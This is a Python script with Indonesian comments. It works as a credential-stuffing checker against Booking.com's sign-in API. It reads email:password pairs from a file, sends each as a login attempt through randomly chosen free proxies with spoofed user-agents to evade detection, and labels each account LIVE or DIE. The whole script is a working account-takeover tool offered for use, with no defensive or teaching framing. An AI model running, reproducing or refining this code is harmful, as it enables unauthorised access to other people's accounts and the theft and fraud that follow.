import json
import random
import requests
import re

# Fungsi untuk menghasilkan user-agent secara acak
def generate_random_user_agent():
    platforms = [
        'Windows NT 10.0',  # Windows 10
        'Windows NT 6.3',   # Windows 8.1
        'Windows NT 6.2',   # Windows 8
        'Windows NT 6.1',   # Windows 7
        'Windows NT 6.0',   # Windows Vista
        'Windows NT 5.1',   # Windows XP
        'Macintosh; Intel Mac OS X 10_15_7',  # Mac OS X
        'Macintosh; Intel Mac OS X 10_14_6',  # Mac OS X
        'X11; Linux x86_64',  # Linux
        'X11; Ubuntu; Linux x86_64',  # Ubuntu Linux
        'X11; Fedora; Linux x86_64'  # Fedora Linux
    ]
    
    browsers = [
        'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',  # Chrome
        'AppleWebKit/537.36 (KHTML, like Gecko) Firefox/96.0',  # Firefox
        'AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',  # Safari
        'AppleWebKit/537.36 (KHTML, like Gecko) Edge/96.0.1054.62',  # Microsoft Edge
        'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36',  # Mobile Safari
    ]
    
    platform = random.choice(platforms)
    browser = random.choice(browsers)
    
    user_agent = f"Mozilla/5.0 ({platform}) {browser}"
    return user_agent

# Fungsi untuk memeriksa format email:password
def is_valid_format(line):
    # Format yang diharapkan adalah email:password
    pattern = r'^\S+@\S+\.\S+:\S+$'  # Email harus memiliki '@' dan password tidak boleh mengandung spasi
    return re.match(pattern, line) is not None

# Fungsi untuk mendapatkan proxy dari ProxyScrape
def get_proxy():
    # URL untuk mendapatkan daftar proxy HTTPS dari ProxyScrape
    url = "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&ssl=yes"
    response = requests.get(url)
    if response.status_code == 200:
        proxies = response.text.split('\r\n')
        return random.choice(proxies)
    else:
        print("Gagal mendapatkan daftar proxy. Menggunakan koneksi langsung.")
        return None

# Gunakan fungsi untuk menghasilkan user-agent secara acak
user_agent = generate_random_user_agent()

# URL untuk permintaan POST
url = 'https://account.booking.com/api/identity/authenticate/v1.0/sign_in/password/submit'

# Header untuk permintaan POST
headers = {
    'User-Agent': user_agent,
    'X-Booking-Client': 'ap',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type': 'application/json'
}

# Baca file empas.txt dan kirim permintaan untuk setiap pasangan email:password
with open('empas.txt', 'r') as file:
    for line in file:
        # Hapus karakter whitespace yang tidak diinginkan
        line = line.strip()
        
        # Periksa format email:password
        if not is_valid_format(line):
            print(f"Format tidak valid untuk baris: {line}")
            continue  # Lanjutkan ke baris berikutnya jika format tidak valid
        
        # Pisahkan email dan password
        email, password = line.split(':')
        
        # Buat payload JSON
        payload = {
            "context": {
                "value": ""
            },
            "identifier": {
                "type": "IDENTIFIER_TYPE__EMAIL",
                "value": email
            },
            "authenticator": {
                "type": "AUTHENTICATOR_TYPE__PASSWORD",
                "value": password
            }
        }
        
        # Ubah payload menjadi JSON
        data = json.dumps(payload)
        
        # Dapatkan proxy
        proxy = get_proxy()
        
        # Lakukan permintaan POST dengan proxy (jika ada)
        if proxy:
            proxies = {
                'http': f'http://{proxy}',
                'https': f'https://{proxy}'
            }
            response = requests.post(url, headers=headers, data=data, proxies=proxies)
        else:
            response = requests.post(url, headers=headers, data=data)
        
        # Parse respons JSON
        response_data = response.json()
        
        # Cek apakah respons memiliki 'context' atau 'error' dan lakukan penanganan sesuai kebutuhan
        if 'context' in response_data:
            # Login berhasil, lakukan sesuatu di sini, misalnya simpan sesi
            respon1 = response_data['context']
            print(f"CHECK =>> {email}:{password} <<= ++ LIVE")
        elif 'error' in response_data:
            # Ada kesalahan dalam proses login, tampilkan pesan kesalahan
            error_message = response_data['error']
            print(f"CHECK =>> {email}:{password} <<= ++ DIE")
        else:
            # Respons tidak sesuai format yang diharapkan
            print(f"CHECK =>> {email}:{password} <<= ++ RECHECK")
